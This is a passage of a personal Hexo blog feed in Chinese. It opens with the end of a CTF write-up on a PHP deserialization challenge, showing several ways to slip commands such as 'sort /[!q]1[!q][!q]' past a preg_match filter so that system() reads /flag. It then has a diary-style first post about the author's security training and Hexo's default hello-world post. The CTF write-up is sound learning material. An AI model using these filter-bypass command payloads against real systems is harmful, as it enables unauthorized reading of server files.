class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后接下来就是绕过 preg_match () 的问题了&lt;/p&gt;
&lt;p&gt;一开始想的有三种方案：1、替代函数；2、取反绕过；3、正则匹配绕过（因为通配符也被禁了所以无法使用通配符绕过）&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;替代函数&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用 more、sort 可以用于 cat 被过滤的情况；dir、vdir 可以替代 ls&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;但是因为这个过滤是一个个字母的匹配且过滤了通配符，所以绕过了 cat 的限制后还是没法读取 flag&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;取反绕过&lt;/p&gt;
&lt;p&gt;这个方法也没成功，但是我一直在纠结为什么不能取反，在这花费了很多时间，所以先把这个坑摆上来，弄懂了再来填&lt;/p&gt;
&lt;p&gt;对字母取反&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;cat /flag&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;=~&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/f|l|a|g|\*|\?/i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;U R A BAD GUY&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后测出来是空格过不了过滤（为什么呢？）于是又想到命令拼接的形式，就是对 cat 和 /flag 取反，然后中间的空格直接通过。拼接&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;~%9C%9E%8B&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;~%D0%99%93%9E%98&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;但是这个方法最终也没有成功（为什么呢？）&lt;strong&gt;经过 unknown 的指点，明白了。因为传过去的 cmd 不会自己解码，他是一整个字符串传过去给 system 执行的，相当于直接执行了 &#39;~%9C%9E%8B&#39;.&#39; &#39;.&#39;&lt;sub&gt;% D0%99%93%9E%98&#39;，所以没法执行。想要执行除非用 system (urldecode (&#39;&lt;/sub&gt;%9C%9E%8B&#39;.&#39; &#39;.&#39;~% D0%99%93%9E%98&#39;)，更加麻烦。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;正则匹配绕过&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;more /[e-h]1[0-b][e-h]&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这种方法通过 [x-y] 匹配 x 到 y 之间的字符（一开始是想到这个的，但是由于匹配的范围太广不够精准，估计匹配到了 /home，然后回显报错权限不足了，以为是这个方法行不通，所以又浪费了很多时间，悲）&lt;/p&gt;
&lt;p&gt;后看大佬的 wp 还有很多中绕过方式，例如 chr () 绕过等等，都摆出来放在下面，积累吧&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//    public $shell = &amp;#x27;strtolower&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//    public $cmd = &amp;#x27;dir ../../../../../&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//    public $cmd = &amp;#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$shell&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//    public $cmd = &amp;#x27;dir&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//    public $cmd = &amp;#x27;more /[e-h]1[0-b][e-h]&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;sort /[!q]1[!q][!q]&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//    public $cmd = &amp;#x27;cd /;echo `more dir`&amp;#x27;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这就是一道比较简单的 php 反序列化题，其中比较难的是绕过 preg_match ()。&lt;/p&gt;
</content>
        <category term="ctf-web" scheme="https://c2young.github.io/tags/ctf-web/" />
        <updated>2023-10-16T16:13:10.000Z</updated>
    </entry>
    <entry>
        <id>https://c2young.github.io/2023/10/16/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</id>
        <title>第一篇博客</title>
        <link rel="alternate" href="https://c2young.github.io/2023/10/16/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
        <content type="html">&lt;h1 id=&#34;第一篇博客&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一篇博客&#34;&gt;#&lt;/a&gt; 第一篇博客&lt;/h1&gt;
&lt;p&gt;其实早就想搭自己的博客了，但是因为懒 or 没空 or 不知道的原因，所以一直没搞。感觉每天都好像挺忙的，但是又不知道在忙些啥，没有看到什么产出。不想再这么颓废下去了，所以搭个博客记录下自己学了啥吧，显得没有那么碌碌无为...&lt;/p&gt;
&lt;h2 id=&#34;关于为什么要搭建自己的个人博客&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关于为什么要搭建自己的个人博客&#34;&gt;#&lt;/a&gt; 关于为什么要搭建自己的个人博客&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;首先是把博客作为我的一个资源库，记录下学习到的东西，防止学完就忘，同时方便自己随时查阅资料&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其次，写博客可以敦促自己的学习进度，记录自己的进步，更加有动力提升自己&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;可以在一个没人认识我的地方随时发癫（bushi&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;关于这个博客以后会发些什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关于这个博客以后会发些什么&#34;&gt;#&lt;/a&gt; 关于这个博客以后会发些什么&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;红蓝对抗（hvv 行动）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;漏洞挖掘&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ctf 赛题复现&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;闲聊 / 发癫&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;等等&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;关于近期计划&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关于近期计划&#34;&gt;#&lt;/a&gt; 关于近期计划&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;完成抽象哥 c2 的项目内容&lt;/p&gt;
&lt;p&gt;本来 c2 的项目应该在暑假结束前就该完成的，但是因为暑假都在忙着准备 hvv、面试 hvv、打 hvv 还有自己太摆了，所以暑假基本没怎么做，到开学才逐渐开始。然后最近因为被传公钥和盐值的时候的编码转换啥的和各种 bug 卡了很久，别的小伙伴应该都做的差不多了，所以要加快进度了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hvv 总结&lt;/p&gt;
&lt;p&gt;暑假参加了两个虎王行动，一个在区护打红队，一个是国护蓝队。通过实战也遇到了很多平时遇不到的情况（特别是国护，还有被打穿之后应急响应的冥场面），所以也是受益匪浅。结束虎王之后就想写写总结了，但是又是一波拖延，最近要提上日程了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ctf 赛题复现&lt;/p&gt;
&lt;p&gt;最近很少做题了，但是比赛还是稍微有打一两个，像羊城杯香山杯这些。虽然没啥成绩，纯纯坐牢，但是坐牢也是进步的过程，起码题目是自己有认真看过思考过的。有空要把最近打过的赛题都复现一下，无论做没做出来，加深下印象。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;挖 cnvd / 企业 src&lt;/p&gt;
&lt;p&gt;上个学期其实也挖过 cnvd，但是是特别水的事件型，没啥意义。希望能在这个学期挖到真正属于自己的 cnvd 通用或者企业 src，毕竟 cnvd / 企业 src 是好的实习的敲门砖。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打红日靶场&lt;/p&gt;
&lt;p&gt;本来一开学就搭好准备日靶场的，但是 c2 被催了，直接把靶场的事给忘了，这个也要重回我的 todo list。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;关于我&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关于我&#34;&gt;#&lt;/a&gt; 关于我&lt;/h2&gt;
&lt;p&gt;去年十一月开始学习 web 安全，至今也差不多一年了。大一一心想走前端开发，但是因为菜，加上感觉开发太卷了而且自己也不太喜欢纯敲代码，所以大二进入信安专业之后转行了信安，并且在一个月的速成后打了招新赛，搭上末班车加入了工作室（甚至打 newstar 的时候我还在苦学前端）。&lt;/p&gt;
&lt;p&gt;进来之后第一感觉就是佬太多了，我和佬的差距太大了，悲。第二感觉就是这 ctf 真不是人打的啊，有时候一些题就是缺少点灵光一闪，get 不到出题人想考的点，又或者是自己知识面确实没那么广，有些操作根本做不出来，被佬薄纱了，悲。进工作室之后也跟着我们自己的 volant 小队打了些比赛，总结就是简单题动动脑子能做，难题直接开摆坐牢...&lt;/p&gt;
&lt;p&gt;后来觉得这样也不是办法啊，光打 ctf 还打不出成绩，这不纯纯浪费时间，再加上我本身就入行晚了... 所以今年三月四月份开始在抽象哥的带领下接触了 src 挖掘。相比于 ctf，挖洞能更快看到成果，而且也更简单，而且如果不是顶级 ctf 选手那样可以多拿奖的话，那还是多挖洞来丰富自己的简历吧（而且挖企业 src 还能赚点小钱，虽然我还没赚到...）。之前挖的都是些没啥意义的事件型的水洞，希望接下来能挖到通用 cnvd 或者企业 src 吧。&lt;/p&gt;
&lt;p&gt;到了暑假准备国护面试的时候，因为面经的缘故接触到了很多比较新的 Java 洞（log4j、fastjson、struts2 和 shiro 等等），最近有空也要复现一下，看看能不能出个总结笔记。在区护打红队的时候好像只拿了七八百分吧，应该是有一个 sql 和好多个弱口令（平平淡淡弱口令才是真），跟企业的专业红队几万分的没得比。后面到北京国护，客户很好，虽然每天 12h 挺累的，但是还可以接受。期间被不讲武德的红队✌凌晨偷袭了好几回，被拿下的机器也蛮多（所幸客户的防守策略无敌，根本摸不到靶标），最后成功守住了靶标，期间看着原厂大哥各种应急溯源出报告，收益匪浅。&lt;/p&gt;
&lt;p&gt;以后应该也是要多偏向实战，接触实战环境吧，ctf 比赛随缘打，至于考研还是就业，先看看吧哈哈。加油。&lt;/p&gt;
</content>
        <category term="闲聊" scheme="https://c2young.github.io/tags/%E9%97%B2%E8%81%8A/" />
        <category term="发癫" scheme="https://c2young.github.io/tags/%E5%8F%91%E7%99%AB/" />
        <updated>2023-10-16T07:06:20.000Z</updated>
    </entry>
    <entry>
        <id>https://c2young.github.io/2023/10/16/hello-world/</id>
        <title>Hello World</title>
        <link rel="alternate" href="https://c2young.github.io/2023/10/16/hello-world/"/>
        <content type="html">&lt;p&gt;Welcome to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvLw==&#34;&gt;Hexo&lt;/span&gt;! This is your very first post. Check &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv&#34;&gt;documentation&lt;/span&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=&#34;&gt;troubleshooting&lt;/span&gt; or you can ask me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==&#34;&gt;GitHub&lt;/span&gt;.&lt;/p&gt;
&lt;h2 id=&#34;quick-start&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#quick-start&#34;&gt;#&lt;/a&gt; Quick Start&lt;/h2&gt;
&lt;h3 id=&#34;create-a-new-post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#create-a-new-post&#34;&gt;#&lt;/a&gt; Create a new post&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo new &lt;span class=&#34;string&#34;&gt;&amp;quot;My New Post&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s&#34;&gt;Writing&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;run-server&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#run-server&#34;&gt;#&lt;/a&gt; Run server&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo server&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=&#34;&gt;Server&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;generate-static-files&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#generate-static-files&#34;&gt;#&lt;/a&gt; Generate static files&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
</content>
        <updated>2023-10-16T03:39:00.137Z</updated>
    </entry>
</feed>
